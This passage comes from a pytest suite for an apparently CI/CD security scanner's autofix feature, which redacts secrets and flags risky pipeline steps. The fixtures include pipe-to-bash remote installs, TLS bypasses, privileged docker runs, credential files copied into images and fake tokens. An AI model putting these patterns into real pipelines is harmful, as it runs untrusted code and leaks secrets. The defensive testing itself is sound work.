        assert once is not None
        assert autofix.generate_fix(_finding("K8S-029"), once) is None


class TestK8S030ControlPlaneTODO:
    def test_inserts_todo_above_node_selector(self):
        manifest = (
            "      nodeSelector:\n"
            "        node-role.kubernetes.io/control-plane: ''\n"
        )
        after = autofix.generate_fix(_finding("K8S-030"), manifest)
        assert after is not None
        assert "TODO(pipeline-check K8S-030)" in after

    def test_inserts_todo_above_master_toleration(self):
        manifest = (
            "      tolerations:\n"
            "        - key: node-role.kubernetes.io/master\n"
            "          operator: Exists\n"
        )
        after = autofix.generate_fix(_finding("K8S-030"), manifest)
        assert after is not None
        assert "TODO(pipeline-check K8S-030)" in after

    def test_no_op_for_unrelated_node_selector(self):
        manifest = (
            "      nodeSelector:\n"
            "        kubernetes.io/os: linux\n"
        )
        assert autofix.generate_fix(_finding("K8S-030"), manifest) is None

    def test_idempotent(self):
        manifest = (
            "      tolerations:\n"
            "        - key: node-role.kubernetes.io/control-plane\n"
            "          operator: Exists\n"
        )
        once = autofix.generate_fix(_finding("K8S-030"), manifest)
        assert once is not None
        assert autofix.generate_fix(_finding("K8S-030"), once) is None


class TestGHA034SecretsInheritTODO:
    def test_inserts_todo_above_secrets_inherit(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    uses: octo/repo/.github/workflows/build.yml@v2\n"
            "    secrets: inherit\n"
        )
        after = autofix.generate_fix(_finding("GHA-034"), wf, tier="unsafe")
        assert after is not None
        assert "TODO(pipeline-check GHA-034)" in after

    def test_no_op_for_explicit_secrets_mapping(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    uses: octo/repo/.github/workflows/build.yml@v2\n"
            "    secrets:\n"
            "      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n"
        )
        assert autofix.generate_fix(_finding("GHA-034"), wf, tier="unsafe") is None

    def test_idempotent(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    uses: octo/repo/.github/workflows/build.yml@v2\n"
            "    secrets: inherit\n"
        )
        once = autofix.generate_fix(_finding("GHA-034"), wf, tier="unsafe")
        assert once is not None
        assert autofix.generate_fix(_finding("GHA-034"), once, tier="unsafe") is None


class TestGCB022SubstitutionOptionLooseDrop:
    def test_drops_allow_loose_line(self):
        cb = (
            "options:\n"
            "  logging: CLOUD_LOGGING_ONLY\n"
            "  substitutionOption: ALLOW_LOOSE\n"
            "steps: []\n"
        )
        after = autofix.generate_fix(_finding("GCB-022"), cb)
        assert after is not None
        assert "ALLOW_LOOSE" not in after
        assert "logging: CLOUD_LOGGING_ONLY" in after

    def test_drops_inline_comment_too(self):
        cb = "  substitutionOption: ALLOW_LOOSE  # tolerate undefined\n"
        after = autofix.generate_fix(_finding("GCB-022"), cb)
        assert after is not None
        assert "substitutionOption" not in after

    def test_no_op_for_must_match(self):
        cb = "options:\n  substitutionOption: MUST_MATCH\n"
        assert autofix.generate_fix(_finding("GCB-022"), cb) is None

    def test_idempotent(self):
        cb = "options:\n  substitutionOption: ALLOW_LOOSE\n"
        once = autofix.generate_fix(_finding("GCB-022"), cb)
        assert once is not None
        assert autofix.generate_fix(_finding("GCB-022"), once) is None


class TestGCB021WorkerPoolTODO:
    def test_inserts_todo_above_options(self):
        cb = (
            "options:\n"
            "  logging: CLOUD_LOGGING_ONLY\n"
            "steps:\n"
            "  - name: gcr.io/foo\n"
        )
        after = autofix.generate_fix(_finding("GCB-021"), cb)
        assert after is not None
        assert "TODO(pipeline-check GCB-021)" in after
        # The TODO sits ABOVE options:, not inside it.
        before_options = after.split("options:")[0]
        assert "TODO(pipeline-check GCB-021)" in before_options

    def test_no_op_when_no_options_block(self):
        # Without an ``options:`` anchor the fixer leaves the file
        # alone — inserting a top-level block from text is too easy
        # to misindent.
        cb = "steps:\n  - name: gcr.io/foo\n"
        assert autofix.generate_fix(_finding("GCB-021"), cb) is None

    def test_idempotent(self):
        cb = "options:\n  logging: CLOUD_LOGGING_ONLY\nsteps: []\n"
        once = autofix.generate_fix(_finding("GCB-021"), cb)
        assert once is not None
        assert autofix.generate_fix(_finding("GCB-021"), once) is None


class TestDF019CopyCredFileTODO:
    def test_inserts_todo_above_id_rsa_copy(self):
        df = "FROM alpine:3.19\nCOPY id_rsa /root/.ssh/id_rsa\n"
        after = autofix.generate_fix(_finding("DF-019"), df)
        assert after is not None
        assert "TODO(pipeline-check DF-019)" in after
        assert df.splitlines()[1] in after

    def test_inserts_todo_above_npmrc_copy(self):
        df = "FROM node:20\nCOPY --chown=node:node .npmrc /home/node/.npmrc\n"
        after = autofix.generate_fix(_finding("DF-019"), df)
        assert after is not None

    def test_inserts_todo_above_aws_credentials(self):
        df = "FROM alpine:3.19\nCOPY .aws/credentials /root/.aws/credentials\n"
        after = autofix.generate_fix(_finding("DF-019"), df)
        assert after is not None

    def test_inserts_todo_above_pem_file(self):
        df = "FROM alpine:3.19\nADD tls.pem /etc/ssl/tls.pem\n"
        after = autofix.generate_fix(_finding("DF-019"), df)
        assert after is not None

    def test_no_op_for_regular_copy(self):
        df = "FROM alpine:3.19\nCOPY app/ /srv/app/\n"
        assert autofix.generate_fix(_finding("DF-019"), df) is None

    def test_idempotent(self):
        df = "FROM alpine:3.19\nCOPY id_rsa /root/.ssh/id_rsa\n"
        once = autofix.generate_fix(_finding("DF-019"), df)
        assert once is not None
        assert autofix.generate_fix(_finding("DF-019"), once) is None


class TestDF020ArgCredNameTODO:
    def test_inserts_todo_above_npm_token_arg(self):
        df = "FROM node:20\nARG NPM_TOKEN\nRUN npm install\n"
        after = autofix.generate_fix(_finding("DF-020"), df)
        assert after is not None
        assert "TODO(pipeline-check DF-020)" in after

    def test_inserts_todo_above_password_arg_with_default(self):
        df = "FROM postgres:16\nARG DB_PASSWORD=changeme\n"
        after = autofix.generate_fix(_finding("DF-020"), df)
        assert after is not None

    def test_inserts_todo_above_secret_arg(self):
        df = "FROM alpine:3.19\nARG APP_SECRET\n"
        after = autofix.generate_fix(_finding("DF-020"), df)
        assert after is not None

    def test_no_op_for_neutral_arg_name(self):
        df = "FROM alpine:3.19\nARG VERSION=1.0\nARG BUILD_DATE\n"
        assert autofix.generate_fix(_finding("DF-020"), df) is None

    def test_idempotent(self):
        df = "FROM node:20\nARG NPM_TOKEN\n"
        once = autofix.generate_fix(_finding("DF-020"), df)
        assert once is not None
        assert autofix.generate_fix(_finding("DF-020"), once) is None


# ── Cloud Build comment-only TODO fixer (GCB-007) ────────────────────


class TestGCB007LatestVersionTODO:
    def test_inserts_todo_above_versions_latest(self):
        cb = (
            "availableSecrets:\n"
            "  secretManager:\n"
            "    - versionName: projects/p/secrets/db/versions/latest\n"
            "      env: DB_PASS\n"
        )
        after = autofix.generate_fix(_finding("GCB-007"), cb)
        assert after is not None
        assert "TODO(pipeline-check GCB-007)" in after

    def test_no_op_when_pinned_version(self):
        cb = (
            "availableSecrets:\n"
            "  secretManager:\n"
            "    - versionName: projects/p/secrets/db/versions/7\n"
            "      env: DB_PASS\n"
        )
        assert autofix.generate_fix(_finding("GCB-007"), cb) is None

    def test_idempotent(self):
        cb = "    - versionName: projects/p/secrets/db/versions/latest\n"
        once = autofix.generate_fix(_finding("GCB-007"), cb)
        assert once is not None
        assert autofix.generate_fix(_finding("GCB-007"), once) is None


# ── Runner-injection comment-only TODO fixers ────────────────────────


class TestGHA036RunsOnInjectionTODO:
    def test_inserts_todo_above_inputs_runner(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    runs-on: ${{ inputs.runner }}\n"
            "    steps:\n"
            "      - run: make\n"
        )
        after = autofix.generate_fix(_finding("GHA-036"), wf)
        assert after is not None
        assert "TODO(pipeline-check GHA-036)" in after
        # TODO lands above the runs-on line, not above the steps block.
        assert after.index("TODO(pipeline-check GHA-036)") < after.index("runs-on:")

    def test_inserts_todo_above_github_event_head_ref(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    runs-on: ${{ github.head_ref }}\n"
            "    steps:\n"
            "      - run: make\n"
        )
        after = autofix.generate_fix(_finding("GHA-036"), wf)
        assert after is not None
        assert "TODO(pipeline-check GHA-036)" in after

    def test_no_op_for_static_runs_on(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: make\n"
        )
        assert autofix.generate_fix(_finding("GHA-036"), wf) is None

    def test_no_op_for_matrix_runs_on(self):
        # ``${{ matrix.os }}`` is author-controlled; the rule
        # excludes it and the autofix shouldn't insert a TODO either.
        wf = (
            "jobs:\n"
            "  build:\n"
            "    strategy:\n"
            "      matrix:\n"
            "        os: [ubuntu-latest, macos-latest]\n"
            "    runs-on: ${{ matrix.os }}\n"
            "    steps:\n"
            "      - run: make\n"
        )
        assert autofix.generate_fix(_finding("GHA-036"), wf) is None

    def test_idempotent(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    runs-on: ${{ inputs.runner }}\n"
            "    steps:\n"
            "      - run: make\n"
        )
        once = autofix.generate_fix(_finding("GHA-036"), wf)
        assert once is not None
        assert autofix.generate_fix(_finding("GHA-036"), once) is None


class TestGL032TagsInjectionTODO:
    def test_inserts_todo_above_inline_list(self):
        cfg = (
            "build_job:\n"
            "  image: alpine:3.19.1\n"
            "  tags: [$CI_COMMIT_REF_NAME]\n"
            "  script: [make]\n"
        )
        after = autofix.generate_fix(_finding("GL-032"), cfg)
        assert after is not None
        assert "TODO(pipeline-check GL-032)" in after

    def test_inserts_todo_above_braced_var(self):
        cfg = (
            "build_job:\n"
            "  image: alpine:3.19.1\n"
            '  tags: ["${CI_COMMIT_MESSAGE}"]\n'
            "  script: [make]\n"
        )
        after = autofix.generate_fix(_finding("GL-032"), cfg)
        assert after is not None

    def test_no_op_for_static_tags(self):
        cfg = (
            "build_job:\n"
            "  image: alpine:3.19.1\n"
            "  tags: [self-managed, ephemeral]\n"
            "  script: [make]\n"
        )
        assert autofix.generate_fix(_finding("GL-032"), cfg) is None

    def test_idempotent(self):
        cfg = (
            "build_job:\n"
            "  tags: [$CI_COMMIT_REF_NAME]\n"
            "  script: [make]\n"
        )
        once = autofix.generate_fix(_finding("GL-032"), cfg)
        assert once is not None
        assert autofix.generate_fix(_finding("GL-032"), once) is None


class TestADO030PoolInjectionTODO:
    def test_inserts_todo_above_top_level_pool_macro(self):
        cfg = (
            "pool: $(Build.SourceBranchName)\n"
            "jobs:\n"
            "  - job: build\n"
            "    steps:\n"
            "      - script: make\n"
        )
        after = autofix.generate_fix(_finding("ADO-030"), cfg)
        assert after is not None
        assert "TODO(pipeline-check ADO-030)" in after

    def test_inserts_todo_above_template_parameter(self):
        cfg = (
            "parameters:\n"
            "  - name: poolName\n"
            "    type: string\n"
            "jobs:\n"
            "  - job: build\n"
            "    pool:\n"
            "      name: ${{ parameters.poolName }}\n"
            "    steps:\n"
            "      - script: make\n"
        )
        after = autofix.generate_fix(_finding("ADO-030"), cfg)
        assert after is not None
        assert "TODO(pipeline-check ADO-030)" in after

    def test_no_op_for_vmimage(self):
        cfg = (
            "jobs:\n"
            "  - job: build\n"
            "    pool:\n"
            "      vmImage: ubuntu-latest\n"
            "    steps:\n"
            "      - script: make\n"
        )
        assert autofix.generate_fix(_finding("ADO-030"), cfg) is None

    def test_idempotent(self):
        cfg = (
            "pool: $(Build.SourceBranchName)\n"
            "jobs:\n"
            "  - job: build\n"
            "    steps:\n"
            "      - script: make\n"
        )
        once = autofix.generate_fix(_finding("ADO-030"), cfg)
        assert once is not None
        assert autofix.generate_fix(_finding("ADO-030"), once) is None


class TestJF032AgentLabelInjectionTODO:
    def test_inserts_todo_above_env_branch_name_label(self):
        groovy = (
            "pipeline {\n"
            '    agent { label "${env.BRANCH_NAME}" }\n'
            "    stages { stage('build') { steps { sh 'make' } } }\n"
            "}\n"
        )
        after = autofix.generate_fix(_finding("JF-032"), groovy)
        assert after is not None
        assert "TODO(pipeline-check JF-032)" in after
        # Groovy comment uses //, not #
        assert "// TODO(pipeline-check JF-032)" in after

    def test_inserts_todo_above_params_label(self):
        groovy = (
            "pipeline {\n"
            "    parameters { string(name: 'NODE_LABEL', defaultValue: 'a') }\n"
            '    agent { label "${params.NODE_LABEL}" }\n'
            "    stages { stage('build') { steps { sh 'make' } } }\n"
            "}\n"
        )
        after = autofix.generate_fix(_finding("JF-032"), groovy)
        assert after is not None
        assert "TODO(pipeline-check JF-032)" in after

    def test_no_op_for_static_label(self):
        groovy = (
            "pipeline {\n"
            "    agent { label 'linux-ephemeral' }\n"
            "    stages { stage('build') { steps { sh 'make' } } }\n"
            "}\n"
        )
        assert autofix.generate_fix(_finding("JF-032"), groovy) is None

    def test_idempotent(self):
        groovy = (
            "pipeline {\n"
            '    agent { label "${env.BRANCH_NAME}" }\n'
            "    stages { stage('build') { steps { sh 'make' } } }\n"
            "}\n"
        )
        once = autofix.generate_fix(_finding("JF-032"), groovy)
        assert once is not None
        assert autofix.generate_fix(_finding("JF-032"), once) is None


# ── HELM-001 / HELM-002 / HELM-003 comment-only TODO fixers ───────────


class TestHelm001ApiVersionTODO:
    def test_inserts_todo_above_apiversion_v1(self):
        chart = "apiVersion: v1\nname: legacy\nversion: 0.1.0\n"
        after = autofix.generate_fix(_finding("HELM-001"), chart)
        assert after is not None
        assert "TODO(pipeline-check HELM-001)" in after
        idx_todo = after.index("TODO(pipeline-check HELM-001)")
        idx_api = after.index("apiVersion: v1")
        assert idx_todo < idx_api

    def test_no_op_on_v2(self):
        chart = "apiVersion: v2\nname: modern\nversion: 0.1.0\n"
        assert autofix.generate_fix(_finding("HELM-001"), chart) is None

    def test_idempotent(self):
        chart = "apiVersion: v1\nname: legacy\nversion: 0.1.0\n"
        once = autofix.generate_fix(_finding("HELM-001"), chart)
        assert once is not None
        twice = autofix.generate_fix(_finding("HELM-001"), once)
        assert twice is None


class TestHelm002DependenciesLockTODO:
    def test_inserts_todo_above_dependencies_key(self):
        chart = (
            "apiVersion: v2\nname: demo\nversion: 0.1.0\n"
            "dependencies:\n"
            "  - name: redis\n"
            "    version: 17.0.0\n"
            "    repository: https://charts.example.com\n"
        )
        after = autofix.generate_fix(_finding("HELM-002"), chart)
        assert after is not None
        assert "TODO(pipeline-check HELM-002)" in after
        idx_todo = after.index("TODO(pipeline-check HELM-002)")
        idx_deps = after.index("dependencies:")
        assert idx_todo < idx_deps

    def test_no_op_when_no_dependencies_block(self):
        chart = "apiVersion: v2\nname: demo\nversion: 0.1.0\n"
        assert autofix.generate_fix(_finding("HELM-002"), chart) is None

    def test_idempotent(self):
        chart = (
            "apiVersion: v2\nname: demo\nversion: 0.1.0\n"
            "dependencies:\n  - name: redis\n    version: 17.0.0\n"
        )
        once = autofix.generate_fix(_finding("HELM-002"), chart)
        assert once is not None
        assert autofix.generate_fix(_finding("HELM-002"), once) is None


class TestHelm003PlaintextRepoTODO:
    def test_inserts_todo_above_http_repository(self):
        chart = (
            "apiVersion: v2\nname: demo\nversion: 0.1.0\n"
            "dependencies:\n"
            "  - name: redis\n"
            "    version: 17.0.0\n"
            "    repository: http://chartmuseum.example.com\n"
        )
        after = autofix.generate_fix(_finding("HELM-003"), chart)
        assert after is not None
        assert "TODO(pipeline-check HELM-003)" in after
        idx_todo = after.index("TODO(pipeline-check HELM-003)")
        idx_repo = after.index("http://chartmuseum")
        assert idx_todo < idx_repo

    def test_no_op_on_https_repository(self):
        chart = (
            "apiVersion: v2\nname: demo\n"
            "dependencies:\n  - name: redis\n"
            "    repository: https://safe.example.com\n"
        )
        assert autofix.generate_fix(_finding("HELM-003"), chart) is None

    def test_matches_git_and_ftp_schemes(self):
        for scheme in ("git", "ftp", "rsync"):
            chart = (
                "apiVersion: v2\nname: demo\n"
                "dependencies:\n  - name: redis\n"
                f"    repository: {scheme}://internal/charts\n"
            )
            after = autofix.generate_fix(_finding("HELM-003"), chart)
            assert after is not None, scheme
            assert "TODO(pipeline-check HELM-003)" in after

    def test_idempotent(self):
        chart = (
            "apiVersion: v2\nname: demo\n"
            "dependencies:\n  - name: redis\n"
            "    repository: http://insecure.example.com\n"
        )
        once = autofix.generate_fix(_finding("HELM-003"), chart)
        assert once is not None
        assert autofix.generate_fix(_finding("HELM-003"), once) is None


# ──────────────────────────────────────────────────────────────────────
# Buildkite / Tekton / Argo fixers
#
# Buildkite, Tekton, and Argo each ride on the cross-provider fixer
# helpers that GHA / GL / BB / ADO / CC / JF have used since v0.2.x.
# These tests lock in the registration: regressing the loops in
# ``autofix/_impl.py`` would silently drop fixer coverage for the
# three thinnest providers in the catalog.
# ──────────────────────────────────────────────────────────────────────


class TestBuildkiteFixers:
    def test_bk002_redacts_secret(self):
        wf = (
            "steps:\n"
            "  - command: echo hi\n"
            "    env:\n"
            "      AWS_KEY: AKIAZ3MHALF2TESTHIJK\n"
        )
        after = autofix.generate_fix(_finding("BK-002"), wf)
        assert after is not None
        assert "AKIAZ3MHALF2TESTHIJK" not in after
        assert "<REDACTED>" in after
        assert "TODO(pipeline-check)" in after

    def test_bk004_comments_out_curl_pipe(self):
        wf = "  - command: curl https://e.example/install.sh | bash\n"
        after = autofix.generate_fix(_finding("BK-004"), wf)
        assert after is not None
        assert "TODO(pipeline-check)" in after

    def test_bk005_strips_privileged(self):
        wf = "  - command: docker run --privileged ubuntu:latest cmd\n"
        after = autofix.generate_fix(_finding("BK-005"), wf, tier="unsafe")
        assert after is not None
        assert "--privileged" not in after
        assert "docker run" in after

    def test_bk008_comments_out_tls_bypass(self):
        wf = "  - command: curl --insecure https://api.example/x\n"
        after = autofix.generate_fix(_finding("BK-008"), wf)
        assert after is not None
        assert "TODO(pipeline-check)" in after

    def test_bk004_idempotent(self):
        wf = "  - command: curl https://e.example/install.sh | bash\n"
        once = autofix.generate_fix(_finding("BK-004"), wf)
        assert once is not None
        assert autofix.generate_fix(_finding("BK-004"), once) is None


class TestTektonFixers:
    def test_tkn005_redacts_secret_in_step_env(self):
        # Tekton task step env shape: ``env: [{name: K, value: V}]``.
        # The shared ``_fix_gha008`` regex matches ``value: V`` lines
        # exactly the same as the YAML CI providers.
        manifest = (
            "apiVersion: tekton.dev/v1\n"
            "kind: Task\n"
            "spec:\n"
            "  steps:\n"
            "    - name: deploy\n"
            "      env:\n"
            "        - name: TOKEN\n"
            "          value: ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n"
        )
        after = autofix.generate_fix(_finding("TKN-005"), manifest)
        assert after is not None
        assert "ghp_aaaaaaaa" not in after
        assert "<REDACTED>" in after

    def test_tkn008_handles_curl_pipe(self):
        manifest = (
            "spec:\n"
            "  steps:\n"
            "    - name: install\n"
            "      script: |\n"
            "        curl https://e.example/i.sh | bash\n"
        )
        after = autofix.generate_fix(_finding("TKN-008"), manifest)
        assert after is not None
        assert "TODO(pipeline-check)" in after

    def test_tkn008_handles_tls_bypass(self):
        manifest = (
            "spec:\n"
            "  steps:\n"
            "    - name: fetch\n"
            "      script: |\n"
            "        curl --insecure https://api.example/data\n"
        )
        after = autofix.generate_fix(_finding("TKN-008"), manifest)
        assert after is not None
        assert "TODO(pipeline-check)" in after


class TestArgoFixers:
    def test_argo006_redacts_secret_in_template_env(self):
        manifest = (
            "apiVersion: argoproj.io/v1alpha1\n"
            "kind: Workflow\n"
            "spec:\n"
            "  templates:\n"
            "    - name: main\n"
            "      container:\n"
            "        env:\n"
            "          - name: API_KEY\n"
            "            value: AKIAZ3MHALF2TESTHIJK\n"
        )
        after = autofix.generate_fix(_finding("ARGO-006"), manifest)
        assert after is not None
        assert "AKIAZ3MHALF2TESTHIJK" not in after
        assert "<REDACTED>" in after

    def test_argo008_handles_curl_pipe(self):
        manifest = (
            "spec:\n"
            "  templates:\n"
            "    - name: install\n"
            "      script:\n"
            "        source: |\n"
            "          curl https://e.example/i.sh | bash\n"
        )
        after = autofix.generate_fix(_finding("ARGO-008"), manifest)
        assert after is not None
        assert "TODO(pipeline-check)" in after

    def test_argo008_handles_tls_bypass(self):
        manifest = (
            "spec:\n"
            "  templates:\n"
            "    - name: fetch\n"
            "      script:\n"
            "        source: |\n"
            "          export NODE_TLS_REJECT_UNAUTHORIZED=0\n"
            "          node index.js\n"
        )
        after = autofix.generate_fix(_finding("ARGO-008"), manifest)
        assert after is not None
        assert "TODO(pipeline-check)" in after

    def test_argo008_no_op_when_safe(self):
        manifest = (
            "spec:\n"
            "  templates:\n"
            "    - name: build\n"
            "      script:\n"
            "        source: |\n"
            "          npm ci && npm run build\n"
        )
        assert autofix.generate_fix(_finding("ARGO-008"), manifest) is None


# ── Roundtrip safety net ──────────────────────────────────────────────


class TestRoundtripSafety:
    """``generate_fix`` bails when a fixer produces broken YAML."""

    def test_bails_when_after_does_not_parse(self, monkeypatch):
        from pipeline_check.core import autofix as af

        @af.register("ZZ-PARSE-BREAK", safety="safe")
        def _break(content, finding):
            return "key: : invalid\n  - lol\n"  # not valid YAML

        wf = "key: value\nother: thing\n"
        assert af.generate_fix(_finding("ZZ-PARSE-BREAK"), wf) is None
        # Re-registering wipes the bogus entry once the test exits.
        af._FIXERS.pop("ZZ-PARSE-BREAK", None)

    def test_bails_when_top_level_type_changes(self):
        from pipeline_check.core import autofix as af

        @af.register("ZZ-TYPE-SWAP", safety="safe")
        def _swap(content, finding):
            return "- a\n- b\n"  # list, was a mapping

        wf = "key: value\nother: thing\n"
        assert af.generate_fix(_finding("ZZ-TYPE-SWAP"), wf) is None
        af._FIXERS.pop("ZZ-TYPE-SWAP", None)

    def test_bails_when_multidoc_count_changes(self):
        from pipeline_check.core import autofix as af

        @af.register("ZZ-DOC-DROP", safety="safe")
        def _drop(content, finding):
            # Strip the second document from a two-doc stream.
            return content.split("---", 1)[0]

        wf = (
            "kind: Deployment\nmetadata:\n  name: a\n"
            "---\n"
            "kind: Service\nmetadata:\n  name: b\n"
        )
        assert af.generate_fix(_finding("ZZ-DOC-DROP"), wf) is None
        af._FIXERS.pop("ZZ-DOC-DROP", None)

    def test_allows_dockerfile_unchanged_shape(self):
        # Dockerfiles parse as scalar strings via ``yaml.safe_load``,
        # so the safety net treats them as opaque and lets the fixer
        # output through unmolested.
        df = "FROM python:3.12-slim\nRUN echo hi\n"
        after = autofix.generate_fix(_finding("DF-001"), df)
        assert after is not None
        assert "TODO(pipeline-check DF-001)" in after


# ── Known correctness gaps (currently failing) ────────────────────────
#
# Each class below pins a specific autofix bug surfaced during the
# 2026-05 quality review. Tests are XFAIL until the fixer is repaired
# so the failure mode is recorded in the suite, not lost in a notepad.


class TestGHA015SkipsReusableWorkflowJobs:
    """GHA-015 fixer must not add ``timeout-minutes`` to reusable-workflow
    calls. The GitHub Actions schema rejects ``timeout-minutes`` on a job
    whose body is a ``uses:`` invocation; the called workflow's own jobs
    declare their own timeouts. The rule itself already skips these
    jobs, the fixer should match."""

    def test_uses_only_job_is_left_alone(self):
        wf = (
            "jobs:\n"
            "  call:\n"
            "    uses: ./.github/workflows/deploy.yml\n"
        )
        after = autofix.generate_fix(_finding("GHA-015"), wf)
        # The only job is a reusable-workflow call, so there is nothing
        # for the fixer to do.
        assert after is None, (
            "fixer inserted timeout-minutes into a uses: job, which "
            "GitHub Actions rejects at runtime"
        )

    def test_mixed_file_leaves_uses_job_alone(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: echo hi\n"
            "  call:\n"
            "    uses: ./.github/workflows/deploy.yml\n"
        )
        after = autofix.generate_fix(_finding("GHA-015"), wf)
        assert after is not None
        # The normal job picks up a timeout, the reusable-workflow call
        # does not.
        assert "build:\n    timeout-minutes: 30" in after
        assert "call:\n    timeout-minutes" not in after


class TestNpmCiPreservesGlobalInstall:
    """``_fix_npm_ci`` must not rewrite ``npm install --global <pkg>`` to
    ``npm ci --global <pkg>``. ``npm ci`` rejects package arguments, so
    the rewrite breaks the step. The GHA-021 rule already exempts
    ``-g``/``--global`` from its match, the fixer should too."""

    def test_global_install_is_left_alone(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: npm install --global typescript\n"
        )
        after = autofix.generate_fix(_finding("GHA-021"), wf)
        # No bare ``npm install`` in the file, only a -g install that
        # the rule itself would not have flagged. The fixer has
        # nothing to do.
        assert after is None, (
            "fixer rewrote ``npm install --global`` to ``npm ci "
            "--global``, which npm rejects"
        )

    def test_short_g_install_is_left_alone(self):
        wf = "  - run: npm install -g typescript\n"
        after = autofix.generate_fix(_finding("GHA-021"), wf)
        assert after is None

    def test_bare_npm_install_is_rewritten(self):
        wf = "  - run: npm install\n"
        after = autofix.generate_fix(_finding("GHA-021"), wf)
        assert after is not None
        assert "npm ci" in after
        assert "npm install" not in after

    def test_npm_install_chained_with_shell_separator_is_rewritten(self):
        wf = "  - run: npm install && npm test\n"
        after = autofix.generate_fix(_finding("GHA-021"), wf)
        assert after is not None
        assert "npm ci && npm test" in after

    def test_npm_install_with_trailing_comment_is_rewritten(self):
        wf = "  - run: npm install  # bootstrap deps\n"
        after = autofix.generate_fix(_finding("GHA-021"), wf)
        assert after is not None
        assert "npm ci" in after


class TestDockerFlagRemovalPreservesIndent:
    """``_strip_docker_flags`` collapses runs of 2+ spaces anywhere on
    the line, including the YAML leading indent. The current
    implementation rewrites ``        - run: docker run --privileged x``
    to ``  - run: docker run x`` (or further), which breaks the step
    mapping; the safety net then bails and the user gets no patch."""

    def test_preserves_eight_space_indent(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - name: launch\n"
            "        run: docker run --privileged ubuntu:latest cmd\n"
        )
        after = autofix.generate_fix(_finding("GHA-017"), wf, tier="unsafe")
        assert after is not None, (
            "fixer produced no patch, likely because collapsed indent "
            "tripped the YAML safety net"
        )
        assert "--privileged" not in after
        # The ``docker run`` line keeps its 8-space indent. A bare
        # substring check catches both the correct shape and any
        # variant that leaves the prefix intact.
        assert "        run: docker run" in after, (
            "fixer mangled the leading indent on the ``run:`` line"
        )


class TestGHA003EnvBlockIndent:
    """``_fix_gha003`` emits an ``env:`` block at the column where the
    run command starts, not the column where the ``run:`` key lives.
    For the common ``  - run: <cmd>`` shape that puts ``env:`` deeper
    than its parent step mapping, producing invalid YAML; the safety
    net bails and the user gets no patch."""

    def test_list_item_run_produces_valid_env_block(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            '      - run: echo "${{ github.event.pull_request.title }}"\n'
        )
        after = autofix.generate_fix(_finding("GHA-003"), wf, tier="unsafe")
        assert after is not None, (
            "fixer produced no patch, likely because the ``env:`` block "
            "was over-indented and tripped the YAML safety net"
        )
        # ``env:`` must sit at the same column as ``run:``, which is 8
        # (two for ``jobs:`` indent, two for ``build:``, two for
        # ``steps:`` list, then the ``- `` list marker plus key).
        assert "        env:" in after
        # And it must NOT sit at the deeper column the current
        # implementation chooses (column of the command start).
        assert "              env:" not in after


# ── Azure timeout fixer (ADO-015) ─────────────────────────────────────


class TestADO015TimeoutMultiJob:
    def test_inserts_timeout_in_job_missing_it(self):
        pipeline = (
            "trigger:\n"
            "  - main\n"
            "jobs:\n"
            "  - job: Build\n"
            "    pool:\n"
            "      vmImage: ubuntu-latest\n"
            "    steps:\n"
            "      - script: echo hi\n"
        )
        after = autofix.generate_fix(_finding("ADO-015"), pipeline)
        assert after is not None
        assert "timeoutInMinutes: 30" in after

    def test_skips_job_that_already_has_timeout(self):
        pipeline = (
            "jobs:\n"
            "  - job: Build\n"
            "    timeoutInMinutes: 60\n"
            "    steps:\n"
            "      - script: echo hi\n"
        )
        assert autofix.generate_fix(_finding("ADO-015"), pipeline) is None

    def test_inserts_only_in_missing_jobs(self):
        pipeline = (
            "jobs:\n"
            "  - job: Build\n"
            "    timeoutInMinutes: 60\n"
            "    steps:\n"
            "      - script: echo build\n"
            "  - job: Test\n"
            "    pool:\n"
            "      vmImage: ubuntu-latest\n"
            "    steps:\n"
            "      - script: echo test\n"
        )
        after = autofix.generate_fix(_finding("ADO-015"), pipeline)
        assert after is not None
        assert after.count("timeoutInMinutes") == 2


# ── Jenkins build discarder (JF-011) ─────────────────────────────────


class TestJF011BuildDiscarder:
    def test_inserts_into_existing_options_block(self):
        jenkinsfile = (
            "pipeline {\n"
            "    agent any\n"
            "    options {\n"
            "        timestamps()\n"
            "    }\n"
            "    stages {\n"
            "        stage('Build') {\n"
            "            steps { echo 'hi' }\n"
            "        }\n"
            "    }\n"
            "}\n"
        )
        after = autofix.generate_fix(
            _finding("JF-011", resource="Jenkinsfile"), jenkinsfile,
        )
        assert after is not None
        assert "buildDiscarder(logRotator(numToKeepStr: '30'))" in after
        assert "timestamps()" in after

    def test_creates_options_block_after_agent(self):
        jenkinsfile = (
            "pipeline {\n"
            "    agent any\n"
            "    stages {\n"
            "        stage('Build') {\n"
            "            steps { echo 'hi' }\n"
            "        }\n"
            "    }\n"
            "}\n"
        )
        after = autofix.generate_fix(
            _finding("JF-011", resource="Jenkinsfile"), jenkinsfile,
        )
        assert after is not None
        assert "options {" in after
        assert "buildDiscarder" in after

    def test_idempotent_when_discarder_exists(self):
        jenkinsfile = (
            "pipeline {\n"
            "    agent any\n"
            "    options {\n"
            "        buildDiscarder(logRotator(numToKeepStr: '10'))\n"
            "    }\n"
            "}\n"
        )
        assert autofix.generate_fix(
            _finding("JF-011", resource="Jenkinsfile"), jenkinsfile,
        ) is None

    def test_returns_none_for_scripted_pipeline(self):
        jenkinsfile = (
            "node {\n"
            "    stage('Build') {\n"
            "        sh 'make'\n"
            "    }\n"
            "}\n"
        )
        assert autofix.generate_fix(
            _finding("JF-011", resource="Jenkinsfile"), jenkinsfile,
        ) is None

    def test_handles_agent_block_form(self):
        jenkinsfile = (
            "pipeline {\n"
